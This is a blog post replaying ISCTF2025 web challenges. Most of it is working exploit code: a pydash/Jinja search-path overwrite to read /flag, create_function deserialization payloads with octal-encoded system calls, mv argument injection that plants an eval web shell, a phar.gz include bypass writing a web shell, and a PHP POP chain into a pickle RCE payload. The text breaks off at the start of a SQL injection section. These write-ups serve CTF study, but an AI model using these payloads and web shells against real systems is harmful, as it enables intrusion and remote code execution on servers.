---
title: ISCTF2025复现
date: 2025-12-08 20:17:56
tags:
- ssti
- 模版搜索路径修改
- 八进制绕过
- create_function利用
- mv参数注入
- gz压缩过滤
- phar
- py.exe解包
- pyc反编译
- snow隐写
- lsb隐写
- ChsPinyinUDL.dat
- clockedpixels隐写
- vc容器挂载
- 文本隐水印
- 零宽隐写
- sqlite特性
- 排序盲注
category:
- 比赛复现
---

# ISCTF2025**复现**

# WEB

## Who am I

注册普通用户，抓包看到type=1

尝试修改type=0

注册admin

登录进入管理员后台。

发现有源码。2个js一个py

源码：

**main.py**

```
 from flask import Flask,request,render_template,redirect,url_for
import json
import pydash

app=Flask(__name__)

database={}
data_index=0
name=''

@app.route('/',methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/register',methods=['GET'])
def register():
    return render_template('register.html')

@app.route('/registerV2',methods=['POST'])
def registerV2():
    username=request.form['username']
    password=request.form['password']
    password2=request.form['password2']
    if password!=password2:
        return '''
        <script>
        alert('前后密码不一致，请确认后重新输入。');
        window.location.href='/register';
        </script>
        '''
    else:
        global data_index
        data_index+=1
        database[data_index]=username
        database[username]=password
        return redirect(url_for('index'))

@app.route('/user_dashboard',methods=['GET'])
def user_dashboard():
    return render_template('dashboard.html')

@app.route('/272e1739b89da32e983970ece1a086bd',methods=['GET'])
def A272e1739b89da32e983970ece1a086bd():
    return render_template('admin.html')

@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username]
        try:
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"

@app.route('/user/name',methods=['POST'])
def name():
    return {'username':user}

def logout():
    return redirect(url_for('index'))

@app.route('/reset',methods=['POST'])
def reset():
    old_password=request.form['old_password']
    new_password=request.form['new_password']
    if user in database and database[user] == old_password:
        database[user]=new_password
        return '''
        <script>
        alert('密码修改成功，请重新登录。');
        window.location.href='/';
        </script>
        '''
    else:
        return '''
        <script>
        alert('密码修改失败，请确认旧密码是否正确。');
        window.location.href='/user_dashboard';
        </script>
        '''

@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)

@app.route('/login',methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    type=request.form['type']
    if username in database and database[username] != password:
        return '''
        <script>
        alert('用户名或密码错误请重新输入。');
        window.location.href='/';
        </script>
        '''
    elif username not in database:
        return '''
        <script>
        alert('用户名或密码错误请重新输入。');
        window.location.href='/';
        </script>
        '''
    else:
        global name
        name=username    
        if int(type)==1:
            return redirect(url_for('user_dashboard'))
        elif int(type)==0:
            return redirect(url_for('A272e1739b89da32e983970ece1a086bd'))

if __name__=='__main__':
    app.run(host='0.0.0.0',port=8080,debug=False)
```

---

发现/impression路由存在ssti模版注入漏洞

但是存在过滤

过滤了6个字符 { } . % < > _ 长度限制为5

```
@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)
```

---

还有一个关键的/operate路由，

```
@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username]
        try:
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"
```

关键函数：

- **`pydash`**：一个Python工具库，`set_()`函数可以按点号路径设置对象的深层属性
- **`globals()`**：Python内置函数，返回当前模块的全局符号表（字典）

执行流程：

```
# 1. 获取用户输入的三个参数
username = "app"  # 示例值
password = "config.KEY"  # 示例值
confirm_password = "new_value"  # 示例值

# 2. 安全检查（脆弱）
if "app" in globals() and "old" not in "config.KEY":
    # 3. 从全局变量获取对象
    target_obj = globals()["app"]  # 获取Flask应用对象
    
    # 4. 使用pydash设置属性
    pydash.set_(target_obj, "config.KEY", "new_value")
    # 等效于：app.config["KEY"] = "new_value"
```

---

比赛时卡在了这个ssti，不知道怎么利用。

其他师傅的题解：

关键：`app.jinja_loader.searchpath`

`app.jinja_loader.searchpath` 是 **Flask 应用中 Jinja2 模板引擎的一个关键配置属性**

将 `searchpath` 设置为 `/`（根目录）后

```
# 修改 searchpath
app.jinja_loader.searchpath = ['/']

# 现在渲染模板时：
render_template('etc/passwd')
# Jinja2 会尝试加载 /etc/passwd 作为模板！



```

**改前**（默认）：

python

```
searchpath = ['/app/templates']  # 只搜索templates目录
render_template('flag') → 只会在 /app/templates/flag 找文件
```

**修改后**：

python

```
searchpath = ['/']  # 搜索整个根目录
render_template('flag') → 会在 /flag 找文件
```

---

**payload：**

```
http://challenge.bluesharkinfo.com:28379/operate?username=app&password=jinja_loader.searchpath&confirm_password=/
```

**在Flask应用中，`app.jinja_loader.searchpath`返回模板搜索路径列表**

- **`username=app`**：获取Flask应用对象
- **`password=jinja_loader.searchpath`**：设置 `app.jinja_loader.searchpath` 属性
- **`confirm_password=/`**：将该属性设置为 `/`（根目录）

**然后：**

```
http://challenge.bluesharkinfo.com:28379/impression?point=flag
```

---

## Bypass

源码：

```
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
        {
            $this->a = $a;
            $this->b = $b;
            $this->check($a,$b);
            eval($a.$b);
        }
    public function __destruct(){
            $a = (string)$this->a;
            $b = (string)$this->b;
            if ($this->check($a,$b)){
                $a("", $b);
            }
            else{
                echo "Try again!";
            }
        }
    private function check($a, $b) {
        $blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
        $blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

        $pattern_a = '/' . implode('|', array_map('preg_quote', $blocked_a, ['/'])) . '/i';
        $pattern_b = '/' . implode('|', array_map('preg_quote', $blocked_b, ['/'])) . '/i';

        if (preg_match($pattern_a, $a) || preg_match($pattern_b, $b)) {
            return false;
        }
        return true;
    }  
}


if (isset($_GET['exp'])) {
    $p = unserialize($_GET['exp']);
    var_dump($p);
}else{
    highlight_file("index.php");
}
```

链子很简单，难点在于绕过waf以及利用`$a("", $b);`来进行RCE得到flag

当时就是卡在这里，想着用create_function但是忘了这个特性了，看了别人的Wp才想起来之前遇到过，不过我如果想起来这个特性应该也过不了waf

### 大佬Wp：

```
其实在$a 的函数也使用了很多 发现为什么最后用到create_function（）
$func = $obj->a;  // 从反序列化对象获取函数名
$param = $obj->b; // 获取参数
$func("", $param); // 调用函数
create_function的作用： create_function 是PHP的一个内置函数，它接受两个参数：

第一个参数：函数参数列表（字符串）
第二个参数：函数体代码（字符串）
内部实现： create_function 实际上会执行：
eval("function __lambda_func($args) { $code }");

然后就是 $b 的payload生成 一开始 使用网上的漏洞
?sort_by=%27%22]);}phpinfo();/*

发现有黑名单那么就要绕过 结合上面的web 使用进制绕过
```

```
<?php
class FLAG {
    private $a;
    protected $b;
    
    public function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
    }
}

// 使用 create_function
$a = "create_function";

// 使用八进制编码绕过过滤
$cmd1 = "\\163\\171\\163\\164\\145\\155";  // system
$cmd2 = "\\143\\141\\164\\040\\057\\146\\154\\141\\147";  // cat /flag
$b = '}$v="' . $cmd1 . '";$v("' . $cmd2 . '");{';
// $b = ';}"' . $cmd1 . '"("' . $cmd2 . '");//';
$obj = new FLAG($a, $b);
$payload = serialize($obj);
echo "序列化payload: " . $payload . "\n";
echo "URL编码: " . urlencode($payload) . "\n";
?>
```

**payload解析**

**这里用了转义符号，所以我就测试了一下有无转义符号的区别，发现要绕过waf必须有转义符号**

**有转义符号的情况**

```
这里$b构造的是
}$v="\163\171\163\164\145\155";$v("\143\141\164\040\057\146\154\141\147");{

也可以这样
;}$v="\163\171\163\164\145\155";$v("\143\141\164\040\057\146\154\141\147");//


<?php


// 使用 create_function
$a = "create_function";

// 使用八进制编码绕过过滤
$cmd1 = "\\163\\171\\163\\164\\145\\155";  // system
$cmd2 = "\\167\\150\\157\\141\\155\\151"; // whoami
$b = ';}$v="' . $cmd1 . '";$v("' . $cmd2 . '");//';

$cmd1($cmd2);   # 直接调用不行
"\\163\\171\\163\\164\\145\\155"("\\167\\150\\157\\141\\155\\151"); 	# 不能执行




eval('$v="'.$cmd1.'";$v("'.$cmd2.'");'); # 可以执行
eval('$v="\\163\\171\\163\\164\\145\\155";$v("\\167\\150\\157\\141\\155\\151");'); # 可以执行
eval('"\\163\\171\\163\\164\\145\\155"("\\167\\150\\157\\141\\155\\151");'); # 可以执行
?>
```

因为这里的八进制字符串加了转义符，所以必须要在双引号下解析过后才能进行动态函数调用，加转义符号的目的是为了绕过waf。

**如果没有转义符号，可以直接调用**

```
<?php
class FLAG {
    private $a;
    protected $b;

    public function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
    }
}

// 使用 create_function
$a = "create_function";

// 使用八进制编码绕过过滤
$cmd1 = "\163\171\163\164\145\155";  // system
$cmd2 = "\167\150\157\141\155\151";  // whoami
$b = ';}' . $cmd1 . '(' . $cmd2 . ');//';
// $b = ';}"' . $cmd1 . '"("' . $cmd2 . '");//';


$a("",$b);	// 可以执行
$cmd1($cmd2);	// 可以执行
"\163\171\163\164\145\155"("\167\150\157\141\155\151");	// 可以执行
?>
```

但是这里必须使用转义符号，然后在eval里解析字符再调用。因为如果不转义，会自动解析八进制编码使其变成字符串，从而失去编码绕过的作用。

演示：

```
<?php
class FLAG {
    private $a;
    protected $b;

    public function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
    }
}

// 使用 create_function
$a = "create_function";

// 使用八进制编码绕过过滤
$cmd1 = "\163\171\163\164\145\155";  // system
$cmd2 = "\167\150\157\141\155\151";  // whoami
echo $cmd1.PHP_EOL;
echo $cmd2.PHP_EOL;

if($cmd1=="system" && $cmd2=="whoami"){
    echo "绕过waf失败";
}
?>
```

```
system
whoami
绕过waf失败
```

会被正则匹配无法绕过waf

---

### **其他payload**

```
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b) {
        $this->a = $a;
        $this->b = $b;
    }
}
 
$a="create_function";
$func="\\150\\151\\147\\150\\154\\151\\147\\150\\164\\137\\146\\151\\154\\145";    #highlight_file
$arg ="\\057\\146\\154\\141\\147";     #/flag
 
#组合成这样的格式是因为调用$a("", $b)即create_function("", $b)时，PHP实际上是$code="function __lambda_func(){ ".$b."}";，然后调用 eval 执行这个字符串eval($code);
#所以我们需要用}去闭合$b前面的操作这样才能让$b配合$a成功执行
$b='}$v="'.$func.'";$v("'.$arg.'");{';
 
$obj=new FLAG($a, $b);
echo "?exp=".urlencode(serialize($obj));
?>
```

这里用的是highlight_file函数来读取flag，同样也是八进制编码绕过

---

### 官方payload

这里可以使用`var_dump`进行回显，使用反引号执行shell命令，用通配符代替

示例：

```PHP
var_dump(`/usr/bin/nl /?lag`);
改为
var_dump(`/usr/b??/?l /?lag`);
```

exp：

```
<?php
class FLAG
{
        private $a;
        protected $b;
        public function __construct($a, $b)
            {
                $this->a = $a;
                $this->b = $b;
            }
        public function __destruct()
            {
                $a = (string)$this->a;
                $b = (string)$this->b;
            }
}

$payload = ";}var_dump(`/usr/b??/?l /?lag`);/*";
$exp = new FLAG("create_function", $payload);
$exp = serialize($exp);
echo urlencode($exp);

# O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A34%3A%22%3B%7Dvar_dump%28%60%2Fusr%2Fb%3F%3F%2F%3Fl+%2F%3Flag%60%29%3B%2F%2A%22%3B%7D
```

---

## mv_upload

两个hint

```
查看提示: HINT1
你知道的，我一向喜欢白盒审计，这不，小蓝鲨每次用vim出题都习惯设置一个备份，但这回粗心的他还没把备份文件删掉就匆匆上传题目了

查看提示: HINT2
小小的偷懒造成了大大的麻烦。一个小小的*让小蓝鲨费劲心思设置的waf成了摆设。什么?你问我为什么?问问mv吧，它或许会help你😘
```

一个文件上传题目，用dirsearch目录扫到备份文件，其实也可以根据hint想到备份文件

vim通过set backup设置备份文件，默认后缀就是~

dirsearch扫到备份文件index.php~获取源码：

```
 <?php
 $uploadDir = '/tmp/upload/'; // 临时目录
 $targetDir = '/var/www/html/upload/'; // 存储目录
 
 $blacklist = [
     'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht','jsp', 'jspa', 'jspx', 'jsw', 'jsv', 'jspf', 'jtml','asp', 'aspx', 'ascx', 'ashx', 'asmx', 'cer', 'aSp', 'aSpx', 'cEr', 'pHp','shtml', 'shtm', 'stm','pl', 'cgi', 'exe', 'bat', 'sh', 'py', 'rb', 'scgi','htaccess', 'htpasswd', "php2", "html", "htm", "asa", "asax",  "swf","ini"
 ];
 
 $message = '';
 $filesInTmp = [];
 
 // 创建目标目录
 if (!is_dir($targetDir)) {
     mkdir($targetDir, 0755, true);
 }
 
 if (!is_dir($uploadDir)) {
     mkdir($uploadDir, 0755, true);
 }
 
 // 上传临时目录
 if (isset($_POST['upload']) && !empty($_FILES['files']['name'][0])) {
     $uploadedFiles = $_FILES['files'];
     foreach ($uploadedFiles['name'] as $index => $filename) {
         if ($uploadedFiles['error'][$index] !== UPLOAD_ERR_OK) {
             $message .= "文件 {$filename} 上传失败。<br>";
             continue;
         }
 
         $tmpName = $uploadedFiles['tmp_name'][$index];
 
         $filename = trim(basename($filename));
         if ($filename === '') {
             $message .= "文件名无效，跳过。<br>";
             continue;
         }
 
         $fileParts = pathinfo($filename);
         $extension = isset($fileParts['extension']) ? strtolower($fileParts['extension']) : '';
 
         $extension = trim($extension, '.');
 
         if (in_array($extension, $blacklist)) {
             $message .= "文件 {$filename} 因类型不安全（.{$extension}）被拒绝。<br>";
             continue;
         }
 
         $destination = $uploadDir . $filename;
 
         if (move_uploaded_file($tmpName, $destination)) {
             $message .= "文件 {$filename} 已上传至 $uploadDir$filename 。<br>";
         } else {
             $message .= "文件 {$filename} 移动失败。<br>";
         }
     }
 }
 
 // 获取临时目录中的所有文件
 if (is_dir($uploadDir)) {
     $handle = opendir($uploadDir);
     if ($handle) {
         while (($file = readdir($handle)) !== false) {
             if (is_file($uploadDir . $file)) {
                 $filesInTmp[] = $file;
             }
         }
         closedir($handle);
     }
 }
 
 // 处理确认上传完毕（移动文件）
 if (isset($_POST['confirm_move'])) {
     if (empty($filesInTmp)) {
         $message .= "没有可移动的文件。<br>";
     } else {
         $output = [];
         $returnCode = 0;
         exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
         if ($returnCode === 0) {
             foreach ($filesInTmp as $file) {
                 $message .= "已移动文件: {$file} 至$targetDir$file<br>";
             }
         } else {
             $message .= "移动文件失败: " .implode(', ', $output)."<br>";
         }
     }
 }
 ?>
 
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <title>多文件上传服务</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 20px; }
         .container { max-width: 800px; margin: auto; }
         .alert { padding: 10px; margin: 10px 0; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
         .success { background: #d4edda; color: #155724; border-color: #c3e6cb; }
         ul { list-style-type: none; padding: 0; }
         li { margin: 5px 0; padding: 5px; background: #f0f0f0; }
     </style>
 </head>
 <body>
 <div class="container">
     <h2>多文件上传服务</h2>
 
     <?php if ($message): ?>
         <div class="alert <?= strpos($message, '失败') ? '' : 'success' ?>">
             <?= $message ?>
         </div>
     <?php endif; ?>
 
     <form method="POST" enctype="multipart/form-data">
         <label for="files">选择文件：</label><br>
         <input type="file" name="files[]" id="files" multiple required>
         <button type="submit" name="upload">上传到临时目录</button>
     </form>
 
     <hr>
 
     <h3>待确认上传文件</h3>
     <?php if (empty($filesInTmp)): ?>
         <p>暂无待确认上传文件</p>
     <?php else: ?>
         <ul>
             <?php foreach ($filesInTmp as $file): ?>
                 <li><?= htmlspecialchars($file) ?></li>
             <?php endforeach; ?>
         </ul>
         <form method="POST">
             <button type="submit" name="confirm_move">确认上传完毕，移动到存储目录</button>
         </form>
     <?php endif; ?>
 </div>
 </body>
 </html>
```

可以看到基本能用的文件名都被过滤了，无法直接上传木马

根据第二个提示猜测mv命令这里可以操作一下

```
exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
```

可以注意到代码是从临时目录使用`mv *`移动到储存目录，而`mv *`这种用法会造成参数注入问题，即`-`开头的文件名会被当作参数进行解析，查看mv的参数：

```
$ mv --help
用法：mv [选项]... [-T] 源文件 目标文件
　或：mv [选项]... 源文件... 目录
　或：mv [选项]... -t 目录 源文件...
将<源文件>重命名为<目标文件>，或将<源文件>移动至指定<目录>。

必选参数对长短选项同时适用。
      --backup[=CONTROL]       为每个已存在的目标文件创建备份
  -b                           类似--backup 但不接受参数
  -f, --force                  覆盖前不询问
  -i, --interactive            覆盖前询问
  -n, --no-clobber             不覆盖已存在文件
如果您指定了-i、-f、-n 中的多个，仅最后一个生效。
      --strip-trailing-slashes        去掉每个源文件参数尾部的斜线
  -S, --suffix=SUFFIX                替换常用的备份文件后缀
  -t, --target-directory=目录  将所有<源文件>移动至指定的<目录>中
  -T, --no-target-directory    将参数中所有<目标文件>部分视为普通文件
  -u, --update                 仅在<源文件>比目标文件更新，或者目标文件
                               不存在时进行移动操作
  -v, --verbose                对正在发生的操作给出解释
  -Z, --context                将目标文件的 SELinux 安全上下文设置为
                                 默认类型
      --help                显示此帮助信息并退出
      --version                显示版本信息并退出

备份文件的后缀为"~"，除非以--suffix 选项或是 SIMPLE_BACKUP_SUFFIX
环境变量指定。版本控制的方式可通过--backup 选项或 VERSION_CONTROL 环境
变量来选择。以下是可用的变量值：

  none, off       不进行备份(即使使用了--backup 选项)
  numbered, t     备份文件加上数字进行排序
  existing, nil   若有数字的备份文件已经存在则使用数字，否则使用普通方式备份
  simple, never   永远使用普通方式备份

GNU coreutils 在线帮助：<https://www.gnu.org/software/coreutils/>
请向 <http://translationproject.org/team/zh_CN.html> 报告 mv 的翻译错误
完整文档请见：<https://www.gnu.org/software/coreutils/mv>
或者在本地使用：info '(coreutils) mv invocation'
```

**解析：**

使用`-b`参数，会使得在移动操作前，生成一个带有~的备份文件，例如原本当前目录下有个`index.php`文件，那么如果再从其他地方`mv`过来一个`index.php`文件，那么原来的`index.php`就会变成`index.php~`

而`--suffix参数`，可以替换常用的备份文件后缀

通过结合`--suffix`参数，便可以任意设置后缀。

**具体步骤：**

1. **先上传木马文件`shell.`到临时目录，同时将其移动到存储目录**
2. **上传`shell.`，`-b`，`--suffix=php`至临时目录，同时再将这三个文件移动至储存目录，触发参数注入生成`shell.php`**
3. **rce读取flag**

官方exp：

```
import requests

url = "http://127.0.0.1:8080"

def upload_file(filename, content):
    post_file = {
        "files[]": (filename, content, "application/octet-stream")
    }

    post_data = {
        "upload": "1"
    }

    res = requests.post(url, files=post_file,data=post_data)
    return res.text

def move_file():
    post_data = {
        "confirm_move": "1"
    }
    res = requests.post(url, data=post_data)
    return res.text

def rce(cmd):
    res = requests.post(url+"/upload/shell.php", data={"cmd": cmd})
    return res.text

if __name__ == "__main__":
    upload_file("shell.", b"<?php eval($_POST['cmd']); ?>")
    move_file()

    upload_file("shell.", b"")
    upload_file("-b", b"")
    upload_file("--suffix=php", b"")
    move_file()

    flag = rce("system('cat /flag');")
    print(flag)
```

---

## include_upload

同样是一个文件上传，查看网页源码发现存在`include.php`

`include.php`

```
<?php
highlight_file(__FILE__);
error_reporting(0);
$file = $_GET['file'];
if(isset($file) && strtolower(substr($file, -4)) == ".png"){
    include'./upload/' . basename($_GET['file']);
    exit;
}
?>
我还以为你真信
我还以为你真信
```

存在文件包含，但是文件名末尾必须是`.png`，这里我当时居然没想到能用`.phar`，脑子短路了。

生成phar文件

```
<?php
$phar = new Phar('exp.phar');
$phar->setStub('<?php 
  $filename="/var/www/html/shell.php";
  $content="<?php eval(\$_POST[1]);?>";
  file_put_contents($filename, $content);
__HALT_COMPILER(); ?>');
$phar->addFromString('nothing','OK');

// generate .phar.gz
$gz = gzopen("exp.phar.gz", 'wb');
gzwrite($gz, file_get_contents('exp.phar'));
gzclose($gz);
?>
```

这里会对文件内容进行过滤，所以需要进行gz压缩绕过

**解题步骤：**

1. 生成`exp.phar.gz`后将`gz`改为`png`然后上传成功。
2. 接着转入`include.php`在url中传入`?file=exp.phar.png`
3. 然后直接连接木马RCE拿到flag

---

官方exp：

```
<?php
$phar = new Phar('exp.phar');
$phar->compressFiles(Phar::GZ);
$phar->startBuffering();

$stub = <<<'STUB'
<?php
  $filename="/var/www/html/2.php";
  $content="<?php eval(\$_POST[1]);?>";
  file_put_contents($filename, $content);
        __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

$fp = gzopen("exp.phar.gz", 'w9');        #压缩为gz绕过过滤
gzwrite($fp, file_get_contents("exp.phar"));
gzclose($fp);

?>

```

---

## 双生序列

这是一个非常精妙的 **“多阶段、多语言”** 联合漏洞利用题目。你需要通过 PHP 的反序列化（POP 链）来铺设环境，最后触发 Python 的反序列化漏洞来执行系统命令。

以下是完整的源码审计和攻击路径分析

1. 架构总览

整个攻击流程分为三个阶段，涉及三个主要文件

1.  `index.php` **(入口)**：

-  允许你存入以 `blueshark:` 开头的任意字符串到数据库。

-  **作用**：这是我们注入序列化 Payload 的入口（Stored Object Injection）。 

1.  `api.php` **(铺路)**： 

-  读取数据库中的内容，并反序列化（允许 `Bridge`, `Writer`, `Shark` 类）。

-  **作用**：这是 PHP POP 链的触发点。我们需要利用它在服务器的 `/tmp/ssxl/` 目录下生成两个关键文件： 

-  `write.bin` + `write.meta`：给 Python 用的恶意数据包。 

-  `run.bin`：给 `run.php` 用的序列化对象。 

1.  `run.php` **(引爆)**： 

-  读取 `/tmp/ssxl/run.bin` 并反序列化（只允许 `Pytools` 类）。

-  **作用**：反序列化 `Pytools` 对象会触发系统命令 `python3 pytools.py`，从而读取 `write.bin` 并最终执行 RCE。 

------

1. PHP POP 链构造 (The Setup)

我们需要构造一个 `Bridge` 对象，它连接了 `Writer` 和 `Shark`。

### **链条逻辑：**

1.  **触发点**：`api.php` 中 `$o = unserialize(...); $r = $o->fetch();`。

1.  **第一步 (**`Bridge`**)**： 

-  `Bridge::fetch()` 访问 `$this->write`。

-  触发 `Bridge::__get('write')`。

-  `__get` 内部调用 `$this->writer->fetch()`。 

1.  **第二步 (**`Writer` **- 生成 Python Payload)**： 

-  `Writer::fetch()` 调用 `write_all()`。

-  `write_all()` 将我们预先 Base64 编码的 Python Payload 写入 `/tmp/ssxl/write.bin`，并使用密钥 `kaqikaqi` 生成签名写入 `write.meta`。

-  *注意*：目录 `/tmp/ssxl` 可能不存在。利用 `Writer::__wakeup()` -> `$this->init()` 来创建目录。设置 `$init = "init"`。 

1.  **第三步 (**`Shark` **- 生成 PHP Trigger)**： 

-  回到 `Bridge::__get`，它返回 `$this->shark`。 

-  `api.php` 接着执行 `echo ... $r`（此时 `$r` 是 Shark 对象）。 

-  `echo` 触发 `Shark::__toString()`。

-  `__toString` 调用 `apply()`，将我们预先准备好的 `Pytools` 序列化字符串写入 `/tmp/ssxl/run.bin`。 

------

1. Python 漏洞利用 (The RCE)

`pytools.py` 存在两个漏洞，结合起来可以 RCE

1.  **密钥同步绕过**：Python 脚本先反序列化对象，读取其中的 `secret` 属性，**然后**才用这个 `secret` 去校验签名。 

-  PHP 的 `Writer` 类使用固定密钥 `"kaqikaqi"` 签名。 

-  只要我们在 Python Payload 里也设置 `secret = b"kaqikaqi"`，签名校验就能通过。

1.  **Pickle RCE**：通过第一层校验后，脚本会读取 `payload` 属性并进行 `pickle.loads(payload)`。这里没有白名单限制，可以直接 RCE。

   ---

### 完整的 EXP 生成脚本

你需要两个脚本：一个生成 Python 的 Payload，一个生成最终提交给 PHP 的 Payload。

**第一步：生成 Python Payload (run locally)**

```
import pickle
import base64

# ==========================================
# 1. 定义与服务器一致的类结构
# ==========================================
class Set:
    def __init__(self):
        # 必须是 kaqikaqi，与 PHP Writer 类同步
        self.secret = b"kaqikaqi" 
        self.payload = b""

# ==========================================
# 2. 构造 RCE Payload (使用 exec 兼容所有系统)
# ==========================================
class RCE:
    def __reduce__(self):
        # 使用 exec 动态执行代码，避免直接序列化 os.system 带来的 nt/posix 兼容性问题
        # 1. 尝试找 flag (通常在根目录 /flag 或 /flag.txt)
        # 2. 将结果写入 /tmp/ssxl/outs.txt (题目要求)
        
        # 这里的命令非常关键，建议用 ls / 先探路，或者直接 cat /flag
        cmd = "import os; os.system('cat /flag > /tmp/ssxl/outs.txt')"
        
        # 如果你不确定 flag 在哪，可以用这个命令列出根目录文件：
        # cmd = "import os; os.system('ls -la / > /tmp/ssxl/outs.txt')"
        
        return (exec, (cmd,))

# ==========================================
# 3. 生成 Payload
# ==========================================
outer = Set()
outer.payload = pickle.dumps(RCE())

# 生成最终数据
final_pickle = pickle.dumps(outer)
print("请复制下面的 Base64 字符串到 PHP 脚本中:")
print("---------------------------------------------------")
print(base64.b64encode(final_pickle).decode())
print("---------------------------------------------------")
```

**第二步：生成 PHP Payload (run locally)**

```
<?php
// === 类定义 (精简版，只保留属性) ===

class Writer {
    public $b64data = "";
    public $init = 'init'; // 关键：让 wakeup 调用 init() 创建目录 /tmp/ssxl
    private $secret = "kaqikaqi"; 

    public function __construct($data) {
        $this->b64data = $data;
    }
}

class Pytools {
    // 这是一个空类，序列化它只是为了写入 run.bin
    // run.php 反序列化它时，会加载服务器上的 Pytools 类定义并执行 run()
}

class Shark {
    public $ser = "";
    public function __construct($s) {
        $this->ser = $s;
    }
}

class Bridge {
    public $writer;   
    public $shark;
    public function __construct($w, $s) {
        $this->writer = $w;
        $this->shark = $s;
    }
}

// === 构造 Payload ===

// 1. 填入 Python 脚本生成的 Base64 字符串
$python_payload = "gASVmgAAAAAAAACMCF9fbWFpbl9flIwDU2V0lJOUKYGUfZQojAZzZWNyZXSUQwhrYXFpa2FxaZSMB3BheWxvYWSUQ12ABJVSAAAAAAAAAIwIYnVpbHRpbnOUjARleGVjlJOUjDZpbXBvcnQgb3M7IG9zLnN5c3RlbSgnY2F0IC9mbGFnID4gL3RtcC9zc3hsL291dHMudHh0JymUhZRSlC6UdWIu";

// 2. 构造 run.bin 的内容 (序列化的 Pytools 对象)
$pytools_payload = serialize(new Pytools());

// 3. 组装 POP 链
$writer = new Writer($python_payload);
$shark = new Shark($pytools_payload);
$bridge = new Bridge($writer, $shark);

// 4. 生成最终 Payload，加上前缀
$final_payload = "blueshark:" . serialize($bridge);

echo $final_payload;
?>

//结果：blueshark:O:6:"Bridge":2:{s:6:"writer";O:6:"Writer":3:{s:7:"b64data";s:220:"gASVmgAAAAAAAACMCF9fbWFpbl9flIwDU2V0lJOUKYGUfZQojAZzZWNyZXSUQwhrYXFpa2FxaZSMB3BheWxvYWSUQ12ABJVSAAAAAAAAAIwIYnVpbHRpbnOUjARleGVjlJOUjDZpbXBvcnQgb3M7IG9zLnN5c3RlbSgnY2F0IC9mbGFnID4gL3RtcC9zc3hsL291dHMudHh0JymUhZRSlC6UdWIu";s:4:"init";s:4:"init";s:14:" Writer secret";s:8:"kaqikaqi";}s:5:"shark";O:5:"Shark":1:{s:3:"ser";s:18:"O:7:"Pytools":0:{}";}}
```

---

### 攻击步骤

1.  **生成 Payload**： 

- 先运行 Python 脚本得到 Base64。

-  将 Base64 填入 PHP 脚本，运行 PHP 脚本得到最终字符串（以 `blueshark:` 开头）。 

1.  **注入 (Index.php)**： 

-  发送 POST 请求到 `index.php`。

-  参数：`s=blueshark:O:6:"Bridge":...` (即上面的完整字符串)。

- 服务器会返回保存成功。

1.  **查看 ID**

-  刷新 `index.php`，在 "Recent" 列表中找到你刚刚提交的那条记录，记下它的 `#id` (例如 `#15`)。

1.  **铺路 (Api.php)**： 

-  访问 `api.php?id=15` (替换为你记下的 ID)。 

-  **预期结果**：页面显示 "喵喵喵!"。

-  **后台发生了什么**： 

-  反序列化了 `Bridge`。 

-  `Writer` 创建了目录 `/tmp/ssxl`，写入了 `write.bin` (恶意 Pickle) 和 `write.meta`。 

-  `Shark` 写入了 `run.bin` (序列化的 `Pytools` 对象)。 

1.  **引爆 (Run.php)**： 

-  访问 `run.php?action=run`。 

-  **后台发生了什么**： 

-  反序列化 `run.bin` -> 得到 `Pytools` 对象。 

-  调用 `blueshark()` -> 触发 `__call` -> `run()`。 

-  执行 `python3 pytools.py`。 

-  Python 脚本加载 `write.bin`，用 `kaqikaqi` 验签通过，反序列化 RCE。 

-  命令执行 `cat /flag > /tmp/ssxl/outs.txt`。 

-  Python 脚本读取 `outs.txt` 并打印。 

-  **预期结果**：Flag 会直接显示在页面响应中（或者包含在 `Pytools` 的 log 输出里）。 































---

## kaqiWeaponShop

```
'''
知识点：
- WAF 黑名单绕过
- ORDER BY 注入
- 排序盲注
- sqlite 特性
- 二分查找实现 substr

刚开始你会在页面上进行测试：输入数字、字母、特殊字符等，确认页面情况。

?id=1，返回编号 1 的武器。
?name=刀，只返回刀类武器。
?p=1，只发生翻页，因为你输入任何字符，都不会报错和 waf detect。

现在我们得到这些信息：
